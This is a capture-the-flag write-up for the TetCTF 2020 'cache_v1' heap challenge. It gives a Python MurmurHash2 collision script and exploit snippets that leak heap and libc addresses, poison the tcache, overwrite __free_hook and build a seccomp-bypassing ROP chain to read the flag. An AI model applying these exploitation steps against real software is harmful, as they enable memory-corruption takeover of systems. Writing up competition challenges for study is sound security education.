# TetCTF 2020 - cache_v1
## Introduction
- **Given files:** `cache`, `cache.cpp`, `libc-2.31.so`, `ld-2.31.so`.
- **Description:** `Flag stored in /home/cache/flag`
- **Category:** Pwnable (actually `crypwn`, to be exact)
- **Summary:** A `C++` glibc 2.31 heap challenge with `seccomp` rules that is very strict. We are given the source file for this challenge, so reverse engineering it is not a problem. The challenge also requires some math and crypto knowledge.

## TL;DR
1. Analyze the source code -> Found that the `caches` use the `name`'s `std::hash` as the key -> Maybe vulnearable to hash collision.
2. Find two names whose hashes collide -> Create a small cache first, then create a large one that collides with it will cause an out-of-bound read and write.
3. Setup the heap perfectly to exploit.
4. Use OOB read to leak `heap` and `libc`.
5. Use OOB write to poison tcache -> overwrite `__free_hook` into ROP to workaround `seccomp` and read the flag.
   
## Analyzing the source code
This program is a cache management system implemented in C++, it has the following functionalities:
- `Create` a cache with a unique name and (almost) arbitrary positive size (the upper bound is very high).
- `Read` data from a cache at an offset.
- `Write` data to a cache at an offset.
- `Erase` a cache.

The `create` cache option uses a global `unordered_map` called `caches` to keep track of created caches. It is indexed by a key which is the `std::hash<std::string>{}(name)` of the inputted `name`. This is maybe vulnearable to a hash collision attack, because if we can find two names that have the same hash, we can overlap a cache's size with another's:
```cpp
caches[std::hash<std::string>{}(name)].size = size;
```

Also, the cache's chunk to store the content on the heap is only created when we try to `write` into it, not when we `create` it, so we can write to a small cache to create a small chunk, then over write the size with the large one.

Because I couldn't find another vulnerability in the implementation, this is the path that I followed.

Also, this is the output of `seccomp-tools dump` on the binary:
```
line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x35 0x07 0x00 0x40000000  if (A >= 0x40000000) goto 0011
0004: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0012
0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
0007: 0x15 0x04 0x00 0x00000003  if (A == close) goto 0012
0008: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0012
0009: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0012
0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
0011: 0x06 0x00 0x00 0x00000000  return KILL
0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

## Finding hash collision (crypto part)
I don't know much about math and cryptography, so I started googling to see which hashing algorithm does `C++` standard library use. It lead me to [this site](https://sites.google.com/site/murmurhash/), where most variances of `MurmurHash` is implemented. The version that `C++` standard library uses in a 64-bit environment is `MurmurHash2Unaligned`, which is implemented as `MurmurHash64A` in `MurmurHash2_64.cpp`.

More googling on how to collide this hash lead me to [this post](http://emboss.github.io/blog/2012/12/14/breaking-murmur-hash-flooding-dos-reloaded/), which shows in details how to create collided keys for `MurmurHash2`. The implementation of `MurmurHash2` in the blog post is almost identical to the one in `C++`, except some constants. I asked my team's crypto player `@pcback` to read it and try to re-implement it for me, and he came up with this script:
```python
INV_MAGIC = 0x5f7a0ea7e59b19bd
R = 16
MASK64 = 0xffffffffffffffff
DIFF = b"\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x80"
m = (0xc6a4a793 << 32) | 0x5bd1e995
h = (0xc70f6907 ^ (16 * m)) & (2**64 - 1)
r = 47

def unshiftRight(x, shift):
    res = x
    for i in range(64):
        res = x ^ res >> shift
    return res

def invert64(n):
    x = (n * 0x5f7a0ea7e59b19bd) & MASK64
    x = unshiftRight(x, r)
    x = (x * 0x5f7a0ea7e59b19bd) & MASK64
    return int.to_bytes(x, 8, 'little')

a = b'A'*16
b = bytes(x^y for x,y in zip(a,DIFF))

x1, x2 = int.from_bytes(a[:8], 'little'), int.from_bytes(a[8:], 'little')
y1, y2 = int.from_bytes(b[:8], 'little'), int.from_bytes(b[8:], 'little')

print((invert64(y1) + invert64(y2)).hex())
print((invert64(x1) + invert64(x2)).hex())
```
The script provides two strings whose hashes collide (hex-encoded):
```
c2c48614896beac4c2c48614896beac4
c2c4c9faed854236c2c4c9faed854236
```
With that in hands, I could continue with the exploit.

## Setup the heap
With the hash collision in hands, my plan was clear: Create a small cache, then collide it with a larger one to achieve out-of-bound read and write through that cache. The first step is to perfectly construct the heap so that I could read/write all the stuffs I need:
```python
# Create a small cache to collide on later
create(collide1, 0x30) 
write(collide1, 0, 8, "A"*8)

# Create victim caches to poison
create("victim1", 0x100) 
write("victim1", 0, 8, "B"*8)
create("victim2", 0x100) 
write("victim2", 0, 8, "C"*8)

# Create large cache to leak libc
create("leak", 0x2000) 
write("leak", 0, 8, "D"*8)

# Create padding cache to avoid consolidate
create("padd", 0x40) 
write("padd", 0, 8, "E"*8)

# Collide the first cache with a very large one
create(collide2, 0x2000) 
```

With the above setup, I have two small `victim` chunks to poison later, and a large chunk that will go into `unsorted bin` when freed to leak `libc`.

## Leak heap and libc
Simply read a heap pointer that is stored somewhere on the heap to leak `heap`, and free the large chunk to leak `libc`:
```python
# Leak heap
read(collide2, 0x40, 8)
heap = u64(r.recv(8)) - 0x144d0
log.info("heap: {}".format(hex(heap)))

# Erase large cache, leak libc
erase("leak")
read(collide2, 0x380, 8)
l.address = u64(r.recv(8)) - 0x1ebbe0
log.info("libc: {}".format(hex(l.address)))
```

## Tcache poisoning
Freeing the two `victim` chunks and we can easily overwrite their `fd` pointer, classic `tcache poisoning`. With that, I then could overwrite `__free_hook` and also had all the leaked addresses in my hands. I could just use my ROP chain that I explained [here](https://blog.efiens.com/post/heap-seccomp-rop/) to read the flag. Note that the `payload` must be put into a cache's `name`, not `content`, because the `name` is what actually got `free()` first when we call `erase`.
```python
# Erase victims, overwrite victim2's fd to __free_hook
erase("victim1")
erase("victim2")
write(collide2, 0x200, 8, p64(l.symbols["__free_hook"]))

# Build ROP payload
base = heap + 0x124b0             # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
... # read the full payload in my other post or my full script
payload += b"/home/cache/flag"

# Create a cache with payload as its name
create(payload, 0x100)
write(payload, 0, 8, "A"*8)

# Overwrite __free_hook with call_gadget
create("free", 0x100)
write("free", 0, 8, p64(call_gadget))

# Execute the chain
erase(payload)
```

The flag is:
```
TetCTF{https://www.youtube.com/watch?v=NvOHijJqups}
```

## Appendix
The MurmurHash2 implementation in `C++` standard library is `MurmurHash2.cpp`.

The script for finding hash collision is `collide.py`.

The full exploit is `a.py`.